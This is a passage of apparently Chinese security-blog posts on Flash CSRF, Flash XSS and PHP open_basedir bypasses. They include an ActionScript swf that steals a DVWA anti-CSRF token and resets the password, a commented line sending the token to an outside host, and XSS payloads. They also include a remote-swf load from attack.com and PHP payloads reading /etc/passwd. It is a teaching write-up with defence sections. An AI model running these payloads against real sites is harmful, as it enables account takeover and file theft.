这里看到，受害者被诱导访问我们服务器上的恶意swf文件后，Flash先向目标服务器访问请求是否存在crossdomain.xml且是否允许当前域访问，当OK后就发送GET方式的恶意表单请求篡改密码。这里注意到右侧的HTTP头字段，由Flash发起的请求会带上用户的会话，Referer为Flash文件所在的地址，同时会添加一个x-flash-version字段用于标志Flash版本信息。 我们发送恶意链接诱使受害者点击访问，自己大概估算个受害者点击访问的时间后，使用admin/hacker用户名密码即可登录成功。 GET型含Anti-CSRF token在前面的基础上，High级添加了Anti-CSRF token机制，即在修改密码的表单处添加了一项隐藏的token，当用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求： 这时就比Low级多了一步，需要先获取当前表单页面的Anti-CSRF token值，再一起发送篡改密码的请求。 这里我们编写恶意swf文件，主要添加了先让受害者请求表单页面，将返回的响应内容通过正则表达式来匹配出此时Anti-CSRF token的值，然后添加上token参数一同发送GET方式表单请求篡改密码： 12345678910111213141516171819202122232425//获取当前页面user_tokenvar targetURL:String = &quot;http://192.168.43.201/dvwa/vulnerabilities/csrf/index.php&quot;;var request:URLRequest = new URLRequest(targetURL);request.method = URLRequestMethod.GET;request.data = &quot;&quot;;sendToURL(request);var loader:URLLoader=new URLLoader();loader.addEventListener(Event.COMPLETE,completeHandler);function completeHandler(event:Event):void&#123;var user_token:String = loader.data.match(&quot;user_token&apos; value=&apos;(.*?)&apos;&quot;)[1];//将token发回//var targetURL2:String = &quot;http://a.com/gettoken.php&quot;;//var request2:URLRequest = new URLRequest(targetURL2);//request2.method = URLRequestMethod.POST;//request2.data = &quot;user_token=&quot; + user_token;//sendToURL(request2);//发起CSRF攻击，篡改密码var request3:URLRequest = new URLRequest(targetURL);request3.method = URLRequestMethod.GET;request3.data = &quot;password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=&quot; + user_token;sendToURL(request3);&#125;loader.load(request); 和Low级一样的原理，不再累赘，看看效果。 当受害者访问的是low.swf文件时，该文件时不带token的，会修改失败，302重定向回之前的页面： 当受害者访问的是high.swf文件时，带上了token参数，成功进行了密码的篡改： 0x04 检测方法检查网站的crossdomain.xml文件，如果allow-access-from标签中domain值设置为*则可能存在Flash CSRF漏洞；如果设置domain值为多个外域，需要人工分析是否存在风险。 0x05 防御方法 当站点不需要跨域请求资源时，尽量删除crossdomain.xml文件； 若需crossdomain.xml文件，则必须严格设置allow-access-from标签中domain的白名单； 0x06 参考The lesser known pitfalls of allowing file uploads on your website crossdomain.xml : Beware of Wildcards Flash CSRF – _Dy","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CSRF","slug":"CSRF","permalink":"https://www.mi1k7ea.com/tags/CSRF/"},{"name":"Flash","slug":"Flash","permalink":"https://www.mi1k7ea.com/tags/Flash/"}]},{"title":"Flash型XSS总结","date":"2019-07-21T15:04:06.000Z","path":"2019/07/21/Flash型XSS小结/","text":"0x01 基础知识Flash与ActionScriptFlash（交互式矢量图和Web动画标准）是一种动画创作与应用程序开发于一身的创作软件。Adobe Flash Professional CC为创建数字动画、交互式Web站点、桌面应用程序以及手机应用程序开发提供了功能全面的创作和编辑环境。Flash广泛用于创建吸引人的应用程序，它们包含丰富的视频、声音、图形和动画。可以在Flash中创建原始内容或者从其它Adobe应用程序（如Photoshop或illustrator）导入它们，快速设计简单的动画，以及使用Adobe ActionScript 3.0开发高级的交互式项目。设计人员和开发人员可使用它来创建演示文稿、应用程序和其它允许用户交互的内容。Flash可以包含简单的动画、视频内容、复杂演示文稿和应用。 ActionScript（简称AS）是由Macromedia（现已被Adobe收购）为其Flash产品开发的 ，最初是一种简单的脚本语言，现在最新版本ActionScript3.0，是一种完全的面向对象的编程语言，功能强大，类库丰富，语法类似JavaScript，多用于Flash互动性、娱乐性、实用性开发，网页制作和RIA（丰富互联网程序）开发。 目前，网上大多数Flash都是应用ActionScript2或ActionScript3来编写的。 swf文件的编译与反编译编译使用Flex SDK，直接去官网下载，解压后进入bin目录输入如mxmlc c:\\..\\..\\xx.as的命令，注意其是依赖于32位的JDK。 当然，也可以使用Adobe Flash CS系列软件。 看个示例，编写个弹框的swf文件： 1、使用Flex SDK： 编写Mi1k7ea.as文件如下： 12345678910111213package&#123; import flash.display.Sprite; import flash.external.ExternalInterface; public class Mi1k7ea extends Sprite &#123; public function Mi1k7ea() &#123; ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;); &#125; &#125;&#125; 进入bin目录输入如mxmlc c:\\..\\..\\Mi1k7ea.as的命令即可生成Mi1k7ea.swf文件： 放到Web目录访问即可触发： 2、使用Adobe Flash CS系列软件： 本地用的是Adobe Flash CS6。 编写如下fla文件： 然后Ctrl+Enter或者点击文件&gt;导出&gt;导出影片来编译成swf文件，再访问即可触发： 反编译 FFDec或硕思闪客精灵软件 在线反编译网站：http://www.showmycode.com Flash调用与跨域请求Flash的调用和请求情形分别如下： HTML调用Flash时，Flash可以改后缀名； Flash可以单独访问，但是其效果类似于HTML调用同域的Flash，但是后缀必须是swf； Flash发动请求时，是根据Flash的域来判断的，而不是HTML来判断： （1）Flash请求同域资源时，直接忽视crossdomain.xml； （2）Flash请求外域资源时，受外域下crossdomain.xml里的策略限制； 可知，Flash跨域请求时主要受crossdomain.xml文件的影响。 crossdomain.xml文件严格遵循XML语法，主要作用就是当被Flash请求到本域资源的时候，是否允许请求。 例如：www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。 crossdomain.xml文件主要包含如下几个节点： 1site-control，allow-access-from，allow-access-from-identity，allow-http-request-headers-from 常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。 示例crossdomain.xml文件： 12345678910&lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE cross-domain-policy SYSTEM \"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd\"&gt;&lt;cross-domain-policy&gt; &lt;site-control permitted-cross-domain-policies=\"master-only\"/&gt; &lt;!-- 允许example.com及其子域访问 --&gt; &lt;allow-access-from domain=\"*.example.com\"/&gt; &lt;!-- 允许http://www.example.com访问 --&gt; &lt;allow-access-from domain=\"www.example.com\"/&gt; &lt;allow-http-request-headers-from domain=\"*.csdn.net\" headers=\"*\"/&gt;&lt;/cross-domain-policy&gt; 注意：这个文件常常被用到Flash型CSRF中，当allow-access-from domain被设置为*后，可能存在Flash型CSRF的风险。 Flash与相关的HTTP头字段RefererFlash请求的Referer为空或者为该swf文件地址。 当为直接发请求的API时不带Referer；当HTML调用外域的Flash时，Flash发送的请求的Referer是Flash的地址而不是HTML的地址。 当HTML页面调用Flash时，此时Flash文件可以改后缀，那么我们请求的Referer就会变成Flash修改后对应的文件的后缀，比如Flash文件后缀改为gif，则通过该Flash请求时的Referer为Referer: http://a.com/exp.gif。 x-flash-versionFlash发送请求时会在HTTP头中添加x-flash-version字段来标识版本。 Flash安全沙箱Flash安全沙盒定义了各个Flash应用程序可以访问的数据及操作的范围，用于控制swf文件间跨域访问。如果两个域之间没有进行信任授权是无法进行数据交互的。 两个不同安全域下的swf文件之间是不能互相交互数据的。如果想让两个处于不同安全域内的swf文件进行数据交互通信，必须要经过授权来实现。经过数据通信授权后即可进行数据通信交互。 swf文件之间跨域访问的授权ActionScript中关于SWF文件跨域信任授权访问是通过Security.allowDomain()方法来实现的。这个方法是应用于swf文件跨域加载swf文件并访问其内部属性、方法、类等的场景。 例如，http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件： 123456var loader:Loader =new Loader();loader.contentLoaderInfo.addEventListener(Event.INIT,init);var url:String=&quot;http://b.example.com/b.swf&quot;;loader.load(new URLRequest(url));function init(event:Event):void&#123; trace(loader.content);&#125; http://b.example.com/b.swf的代码： 12Security.allowDomain(&quot;a.example.com&quot;);Security.allowDomain(&quot;*&quot;); 上面是两种不同的设置方式： 只允许a.example.com访问b.example.com中的SWF文件 如果使用*号那么任何域中的SWF文件都能访问执行调用b.exaple.com中的SWF文件。 HTML跨域加载Flash时的授权在HTML页面嵌入Flash时，其中的Object和Embed标签都有allowScriptAccess参数和allowNetworking参数，主要是用于在HTML页面调用执行Flash文件的场景。 allowScriptAccess：控制html页面与Flash页面的通讯。 always：html和Flash页面的通讯不做任何的限制； samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】； never：html和Flash禁止通讯。 allowNetworking：控制Flash与外部的网络通讯。 all：Flash所有的网络API通讯接口都可用； internal：navigateToURL，fscommand，ExternalInterface.call不可用； none：所有的网络API不可用。 HTML中嵌入Flash在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签。 IE下嵌入： 12345&lt;object codeBase=\"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"&gt;&lt;param name=\"movie\" value = \"http://example.com/exp.swf\" /&gt;&lt;param name=\"allowScriptAccess\" value=\"always\" /&gt;&lt;param name=\"allowNetworking\" value=\"all\" /&gt;&lt;/object&gt; 非IE下嵌入（IE8能成功，本地最新IE11也OK）： 12345&lt;object type=\"application/x-shockwave-Flash\" data=\"./exp.swf\"&gt;&lt;param name=\"movie\" value = \"./exp.swf\" /&gt;&lt;param name=\"allowScriptAccess\" value=\"always\" /&gt;&lt;param name=\"allowNetworking\" value=\"all\" /&gt;&lt;/object&gt; 非IE下嵌入的Demo示例，嵌入同源站点的Mi1k7ea.swf，其作用是弹框： 1234567&lt;html&gt; &lt;object id=\"lso\" type=\"application/x-shockwave-Flash\" data=\"http://127.0.0.1/Mi1k7ea.swf\"&gt; &lt;param name=\"movie\" value = \"http://127.0.0.1/Mi1k7ea.swf\" /&gt; &lt;param name=\"allowScriptAccess\" value=\"always\" /&gt; &lt;param name=\"allowNetworking\" value=\"all\" /&gt; &lt;/object&gt;&lt;/html&gt; 在Firefox上访问直接触发，然而本地最新版的IE11也能成功嵌入触发： Flash的参数传递Flash的参数传递形式按ActionScript语言的版本来分： ActionScript 2：以_root.argv形式，argv直接就是参数名 ActionScript 3：以loaderInfo.parameters形式，返回key和value的字典结构。 0x02 Flash XSSFlash型XSS，即由Flash插件引起的一系列XSS问题，主要有以下两种方式： 与JavaScript通信引发的XSS； 加载第三方资源引发的XSS； ExternalInterface.callFlash中可以使用ExternalInterface.call来执行JavaScript代码。 ExternalInterface.callzhong1可传递0个参数或传递多个参数，这里我们只探讨如下两个： ExternalInterface.call(“函数名”) ExternalInterface.call(“函数名”,”参数”) 第一个参数可控FlashXss.as，这里我们可以传入第一个参数值： 123456789101112131415package&#123; import flash.display.Sprite; import flash.external.ExternalInterface; public class FlashXss extends Sprite &#123; public function FlashXss() &#123; var jsFunction:String = loaderInfo.parameters.movieName; var param:String = &quot;Mi1k7ea&quot;; ExternalInterface.call(jsFunction, param); &#125; &#125;&#125; 将该as文件编译成swf文件： 将该swf放在Web目录下。尝试访问并输入payload?movieName=alert，在Chrome下不能成功执行swf而是变成了下载文件，换了Firefox和IE就可以了： 再次输入?movieName=alert(&#39;hacked&#39;)： 使用IE的开发者工具调试，F12打开IE的开发人员工具-&gt;脚本-&gt;启动调试-&gt;全部中断，再次访问URL即可中断下来： 代码如下： 1try &#123; __flash__toXML(alert('hacked')(\"Mi1k7ea\")) ; &#125; catch (e) &#123; \"&lt;undefined/&gt;\"; &#125; 上面这段代码是ExternalInterface.call底层代码。可以看到是对输入参数直接拼接到了相应的JavaScript代码中，而这段代码会先执行alert(‘hacked’)，然后将alert(‘hacked’)(“Mi1k7ea”)的返回值传入__flash__toXML()函数。 第二个参数可控FlashXss.as，这里我们只能控制传入第二个参数值： 123456789101112131415package&#123; import flash.display.Sprite; import flash.external.ExternalInterface; public class FlashXss extends Sprite &#123; public function FlashXss() &#123; // 定义字符串变量名jsFunction，值从url的movieName获取 var param:String = loaderInfo.parameters.movieName; ExternalInterface.call(&quot;console.log&quot;, param); &#125; &#125;&#125; 输入payload?movieName=\\&quot;));alert(&#39;mi1k7ea&#39;);}catch(e){}//： 我们在IE的开发者工具中调试分析看看，先输入?movieName=mi1k7ea&quot;，即测试双引号是否被转义： 可以看到是对双引号进行了转义。 因此，当我们输入反斜杠和双引号后，由于反引号会被转义掉，从而使其后面的双引号可以逃逸出来让console.log()的双引号得以闭合，然后再构造后面恶意的JS代码即可。在IE调试下的结构如图： getURL在Flash中ActionScript 2可以使用getURL来执行JavaScript。 getURLTest.fla： 1234var Fei_xml:XML = new XML(); //创建xml对象Fei_xml.ignoreWhite = true; //Fei_xml.onLoad = function()&#123; getURL(Fei_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue);&#125; //获取值Fei_xml.load(_root.mi1k7ea); //加载XML文档 使用FlashCS6编译成swf。 在Web目录中编辑a.xml文件，用于触发XSS： 1234&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;&lt;data&gt; &lt;link&gt;javascript:alert('Flash XSS')&lt;/link&gt;&lt;/data&gt; 注意：childNodes[0]的个数和目标XML文件中JS代码所在的内嵌标签数量有关，必须设置正确才能成功触发。 URL参数栏输入目标XML文件即可触发XSS： 造成Flash XSS的主要原因就是没对?mi1k7ea=a.xml获取的内容进行过滤导致的。 这里提供一个查找此类漏洞文件的Google Hack关键字：filetype:swf inurl:xml navigateToURL在ActionScript 3中已经不在支持getURL了，但可以用navigateToURL来执行JavaScript。 navigateToURLTest.as，这里用Flex编译： 12345678910111213141516171819202122232425262728package&#123; import flash.display.Sprite; import flash.events.Event; import flash.net.URLLoader; import flash.net.URLRequest; import flash.net.navigateToURL; public class navigateToURLTest extends Sprite &#123; public function navigateToURLTest() &#123; var url:String = stage.loaderInfo.parameters.url //获取url参数值 var req:URLRequest = new URLRequest(&quot;flash.xml&quot;); var ld:URLLoader = new URLLoader(); ld.addEventListener(Event.COMPLETE ,ok); function ok(evtObj:Event):void &#123; if(ld.data)&#123; //navigateToURL(new URLRequest(&quot;javascript:alert(&quot;+url+&quot;)&quot;),&apos;_self&apos;) navigateToURL(new URLRequest(url),&apos;_self&apos;) //通过navigateToURL调用执行 &#125; else &#123; &#125; &#125; ld.load(req) &#125; &#125;&#125; 输入payload?url=javascript:alert(&#39;navigateToURL hacked&#39;)： htmlText在Flash里支持HTMLText属性，HTMLText的作用是显示html标签等。 htmlTextTest.as： 123456789101112131415161718package&#123; import flash.display.Sprite; import flash.text.TextField; public class htmlTextTest extends Sprite &#123; public function htmlTextTest() &#123; var a:String = root.loaderInfo.parameters.Mi1k7ea //获取提交参数的值 var info:TextField = new TextField(); //创建控件对象 info.multiline=true; info.wordWrap=true; info.htmlText = a; //显示 addChild(info); &#125; &#125;&#125; Flash支持htmlText属性，其作用是显示html标签等。这里我们可以使用img或a标签触发xss代码。 a标签触发Flash XSS先看用a标签的情况，在href中输入js伪协议实现执行js代码，从而触发Flash XSS。 输入payload?Mi1k7ea=&lt;a href=&#39;javascript:alert(&quot;htmlText hacked&quot;)&#39;&gt;Click Me!&lt;/a&gt;： img标签触发XSF这里我们使用img标签来加载一个远程含有JS跨站代码的swf文件从而实现XSF攻击。 远程含有XSS代码的swf文件，这里简单写个例子Mi1k7ea.as： 12345678910111213package&#123; import flash.display.Sprite; import flash.external.ExternalInterface; public class Mi1k7ea extends Sprite &#123; public function Mi1k7ea() &#123; ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;); &#125; &#125;&#125; 编译好swf文件后放置在远程服务器中。 输入payload?Mi1k7ea=&lt;img src=&#39;http://127.0.0.1/Mi1k7ea.swf&#39;&gt;： 未初始化变量导致的XSS在PHP中Globals全局变量在开启的时候，允许在POST个GET参数中改变php脚本中变量的值，也就是经典的全局变量导致的变量覆盖漏洞。在ActionScript 2中也有类似的特性，任何未被初始化的变量都可以以POST或GET方式来改变变量的值，因此会导致一些安全问题。 var.fla，这里未初始化user变量： 1234if(user)&#123;getURL(_root.mi1k7ea);&#125; 输入payload?user=1&amp;mi1k7ea=javascript:alert(&#39;var hacked&#39;)： XSF跨站Flash攻击，就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件，这样就有可能造成XSF攻击，以下函数如果使用不当就很容易产生XSF问题： 123456789loadVariables()loadMovie()loadMovieNum()FScrollPane.loadScrollContent()LoadVars.send()XML.load(&apos;URL&apos;)LoadVars.load(&apos;url&apos;)Sound.loadSound(&apos;url&apos;)NetStream.play(&apos;url&apos;) 通过这些恶意接口，可以指定URL为我们构造的恶意文件如swf或xml文件，从而在目标网站实现JS攻击。 直接看个例子，XSFTest.as： 12345678910111213141516171819package&#123; import flash.display.Sprite; import flash.display.Loader; import flash.net.URLRequest; public class XSFTest extends Sprite &#123; public function XSFTest() &#123; var param:Object = root.loaderInfo.parameters; var swf:String = param[&quot;swf&quot;]; var myLoader:Loader = new Loader(); var url:URLRequest = new URLRequest(swf); myLoader.load(url); addChild(myLoader); &#125; &#125;&#125; XSF.html： 12345678&lt;html&gt; &lt;object id=\"lso\" type=\"application/x-shockwave-Flash\" data=\"http://127.0.0.1/XSFTest.swf\"&gt; &lt;param name=\"movie\" value = \"http://127.0.0.1/XSFTest.swf\" /&gt; &lt;param name=\"allowScriptAccess\" value=\"always\" /&gt; &lt;param name=\"allowNetworking\" value=\"all\" /&gt; &lt;param name=\"Flashvars\" value=\"swf=http://attack.com/Mi1k7ea.swf\" /&gt; &lt;/object&gt;&lt;/html&gt; 至于Mi1k7ea.swf文件，是前面第一节示例用于XSS弹框的Demo，这里作为攻击者的恶意swf文件。 先看下直接访问XSFTest.swf文件再传入远程服务器上的swf文件看看能不能执行成功： 可以看到，请求了远程服务器上的swf文件但并没有成功执行该swf文件。原因在于远程服务器上的swf文件并没有对Flash的跨域请求进行相应的授权。 如果访问目标服务器的XSF.html页面，可以看到XSF.html中嵌入的XSFTest.swf文件通过参数传入成功调用了远程服务器上的swf文件，关键在于allowScriptAccess和allowNetworking的设置进行了授权： 0x03 漏洞挖掘黑盒测试由于Flash XSS是前端问题，swf文件可下载到本地且是可反编译的，因此就可直接进行白盒测试。 白盒测试简单分为以下几步： 1、将目标swf文件下载到本地，反编译得到源码； 2、搜索危险函数，如下： 12345678910111213ExternalInterface.call()getURL()navigateToURL()htmlTextloadVariables()loadMovie()loadMovieNum()FScrollPane.loadScrollContent()LoadVars.send()LoadVars.load()XML.load()Sound.loadSound()NetStream.play() 3、若存在危险函数，则进一步查找是否有接受外部输入参数的关键字，即寻找AS2和AS3下的传参关键字，如下： 12_root.argvloaderInfo.parameters 4、若都存在，则需要进行最后的人工代码审计。 0x04 防御方法 如果无嵌入Flash的需求，尽量禁用embed和object标签； 对Flash文件的输入输出编码过滤； 在HTML中嵌入Flash时，严格设置allowScriptAccess参数和allowNetworking参数的值，遵循权限最小化原则； 可参考一些网上写好的过滤函数，如： 123456789101112131415161718public static function checkJsFunctionValid(functionName:String):Boolean&#123; var reg:RegExp = /^[a-zA-Z0-9_\\.]+$/; return reg.test(functionName);&#125; public static function checkObjectIdValid():Boolean&#123; if (ExternalInterface.available) &#123; var objectId:String = ExternalInterface.objectID; if (!objectId || (objectId == objectId.replace(/[^0-9a-zA-Z_]/g , &quot;&quot;))) return true; else return false; &#125; return true;&#125; 0x05 参考Flash XSS Security 浅谈flash引发的跨站问题 Flash XSS攻击总结 常见Flash XSS攻击方式 Flash XSS 漏洞详解 根治的好办法","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"},{"name":"Flash","slug":"Flash","permalink":"https://www.mi1k7ea.com/tags/Flash/"}]},{"title":"浅谈几种Bypass open_basedir的方法","date":"2019-07-20T03:24:35.000Z","path":"2019/07/20/浅谈几种Bypass-open-basedir的方法/","text":"0x01 open_basediropen_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。 假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。 注意：用open_basedir指定的限制实际上是前缀，而不是目录名。 为了演示下面的几个示例，我这里环境的open_basedir设置为Web目录和tmp目录： 测试一下，我在/home目录中新建一个1.txt文件，尝试对其进行读取，发现读取失败： 换了Web目录及其子目录和tmp目录中的文件就能成功读取，这就是open_basedir所起到的作用。 0x02 利用命令执行函数Bypass但是open_basedir对命令执行函数没有限制，我们可以使用system()函数试一下，在前面的代码前加上system()代码来进行对比： 12345&lt;?php//echo file_get_contents('/home/1.txt');show_source(__FILE__);system('cat /home/1.txt');?&gt; 确实能够成功读到目标文件，不受open_basedir的限制： 至于其他的命令执行函数可自行尝试。 但是一般情况下，system()等命令执行函数可能会被disable_functions给禁用掉，因此运用到的场景可能并不多。 0x03 利用symlink()函数Bypass符号链接 符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。 symlink()函数(PHP 4, PHP 5, PHP 7) symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE；如果失败，则返回FALSE。 1symlink ( string $target , string $link ) : bool 参数 描述 target 必需。连接的目标。 link 必需。连接的名称。 当然一般情况下这个target是受限于open_basedir的。 Bypass先给出payload，原理在后面说明，这里需要跨几层目录就需要创建几层目录： 123456789101112131415161718&lt;?phpmkdir(\"A\");chdir(\"A\");mkdir(\"B\");chdir(\"B\");mkdir(\"C\");chdir(\"C\");mkdir(\"D\");chdir(\"D\");chdir(\"..\");chdir(\"..\");chdir(\"..\");chdir(\"..\");symlink(\"A/B/C/D\",\"7ea\");symlink(\"7ea/../../../../etc/passwd\",\"exp\");unlink(\"7ea\");mkdir(\"7ea\");?&gt; 访问该PHP文件后，后台便生成了两个目录和一个名为exp的符号链接： 在Web中我们直接访问exp即可读取到目标文件： 原理就是：创建一个链接文件7ea，用相对路径指向A/B/C/D，再创建一个链接文件exp指向7ea/../../../../etc/passwd。其实指向的就是A/B/C/D/../../../../etc/passwd，其实就是/etc/passwd。这时候删除7ea，再创建一个7ea目录，但exp还是指向7ea/../../../etc/passwd，所以就成功跨到/etc/passwd了。 重点在这四句： 1234symlink(\"A/B/C/D\",\"7ea\");symlink(\"7ea/../../../../etc/passwd\",\"exp\");unlink(\"7ea\");mkdir(\"7ea\"); payload构造的注意点就是：要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个../来设置目标文件。 0x04 利用glob://伪协议Bypassglob://伪协议glob:// — 查找匹配的文件路径模式。 glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下： 12345678&lt;?php// 循环 ext/spl/examples/ 目录里所有 *.php 文件// 并打印文件名和文件尺寸$it = new DirectoryIterator(\"glob://ext/spl/examples/*.php\");foreach($it as $f) &#123; printf(\"%s: %.1FK\\n\", $f-&gt;getFilename(), $f-&gt;getSize()/1024);&#125;?&gt; Bypass只是用glob://伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。 方式1——DirectoryIterator+glob://DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。 DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件： 1234567&lt;?php$c = $_GET['c'];$a = new DirectoryIterator($c);foreach($a as $f)&#123; echo($f-&gt;__toString().'&lt;br&gt;');&#125;?&gt; 输入glob:///*即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件： 方式2——opendir()+readdir()+glob://opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。 这里结合两个函数来列举根目录中的文件： 123456789&lt;?php$a = $_GET['c'];if ( $b = opendir($a) ) &#123; while ( ($file = readdir($b)) !== false ) &#123; echo $file.\"&lt;br&gt;\"; &#125; closedir($b);&#125;?&gt; 效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。 0x05 利用chdir()与ini_set()组合Bypass基本原理这种利用方式跟open_basedir存在缺陷的处理逻辑有关，具体原理可参考： 《通过chdir来bypass open_basedir》 《从PHP底层看open_basedir bypass》 Bypass测试Demo，放置在Web根目录下，在执行输入参数的PHP代码前后获取open_basedir的值看是否改变了： 123456&lt;?phpecho 'open_basedir: '.ini_get('open_basedir').'&lt;br&gt;';echo 'GET: '.$_GET['c'].'&lt;br&gt;';eval($_GET['c']);echo 'open_basedir: '.ini_get('open_basedir');?&gt; 输入以下payload： 1mkdir('mi1k7ea');chdir('mi1k7ea');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd'); 可以看到open_basedir被设置为’/‘了，整个失去了效果： 注意，如果php文件在Web根目录，则需要构造一个相对可上跳的open_basedir： 123mkdir('mi1k7ea');chdir('mi1k7ea');ini_set('open_basedir','..'); 如果php文件直接在Web目录的子目录的话，就可不用创建相对可上跳的open_basedir了。 0x06 利用bindtextdomain()函数Bypassbindtextdomain()函数(PHP 4, PHP 5, PHP 7) bindtextdomain()函数用于绑定domain到某个目录的函数。 函数定义如下： 1bindtextdomain ( string $domain , string $directory ) : string Bypass利用原理是基于报错：bindtextdomain()函数的第二个参数\\$directory是一个文件路径，它会在\\$directory存在的时候返回\\$directory，不存在则返回false。 payload： 12345&lt;?phpprintf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));$re = bindtextdomain('xxx', $_GET['dir']);var_dump($re);?&gt; 成功访问到存在的文件是会返回当前文件的路径的： 若访问的文件不存在则返回false： 可以看到，和前面几种方法相比，实在是相形见绌，只能应用于判断目标文件是否存在，有利于后续和其他漏洞进行组合利用。 0x07 利用SplFileInfo::getRealPath()类方法BypassSplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7) SplFileInfo类为单个文件的信息提供高级面向对象的接口。 SplFileInfo::getRealPath (PHP 5 &gt;= 5.2.2, PHP 7) SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。 Bypass和bindtextdomain的原理一样，是基于报错的方式，返回结果都是一样的，就不再多演示，这里直接给出payload： 12345&lt;?phpecho '&lt;b&gt;open_basedir: ' . ini_get('open_basedir') . '&lt;/b&gt;&lt;br /&gt;';$info = new SplFileInfo($_GET['dir']);var_dump($info-&gt;getRealPath());?&gt; 0x08 利用realpath()函数Bypassrealpath()函数(PHP 4, PHP 5, PHP 7) realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。 函数定义如下： 1realpath ( string $path ) : string Bypass环境条件：Windows 基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符&lt;和&gt;，不然只能进行暴破。 payload： 1234567891011121314151617181920&lt;?phpini_set('open_basedir', dirname(__FILE__));printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));set_error_handler('isexists');$dir = 'E:/wamp64/';$file = '';$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';for ($i=0; $i &lt; strlen($chars); $i++) &#123; $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; realpath($file);&#125;function isexists($errno, $errstr)&#123; $regexp = '/File\\((.*)\\) is not within/'; preg_match($regexp, $errstr, $matches); if (isset($matches[1])) &#123; printf(\"%s &lt;br/&gt;\", $matches[1]); &#125;&#125;?&gt; 可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个： 0x09 脚本合集p牛的脚本脚本原理就是利用symlink()函数来Bypass的原理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;?php/** by phithon* From https://www.leavesongs.com* detail: http://cxsecurity.com/issue/WLB-2009110068*/header('content-type: text/plain');error_reporting(-1);ini_set('display_errors', TRUE);printf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());printf(\"disable_functions: %s\\n\", ini_get('disable_functions'));$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');$relat_file = getRelativePath(__FILE__, $file);$paths = explode('/', $file);$name = mt_rand() % 999;$exp = getRandStr();mkdir($name);chdir($name);for($i = 1 ; $i &lt; count($paths) - 1 ; $i++)&#123; mkdir($paths[$i]); chdir($paths[$i]);&#125;mkdir($paths[$i]);for ($i -= 1; $i &gt; 0; $i--) &#123; chdir('..');&#125;$paths = explode('/', $relat_file);$j = 0;for ($i = 0; $paths[$i] == '..'; $i++) &#123; mkdir($name); chdir($name); $j++;&#125;for ($i = 0; $i &lt;= $j; $i++) &#123; chdir('..');&#125;$tmp = array_fill(0, $j + 1, $name);symlink(implode('/', $tmp), 'tmplink');$tmp = array_fill(0, $j, '..');symlink('tmplink/' . implode('/', $tmp) . $file, $exp);unlink('tmplink');mkdir('tmplink');delfile($name);$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/&#123;$exp&#125;\";$exp = \"http://&#123;$_SERVER['SERVER_NAME']&#125;&#123;$exp&#125;\";echo \"\\n-----------------content---------------\\n\\n\";echo file_get_contents($exp);delfile('tmplink');function getRelativePath($from, 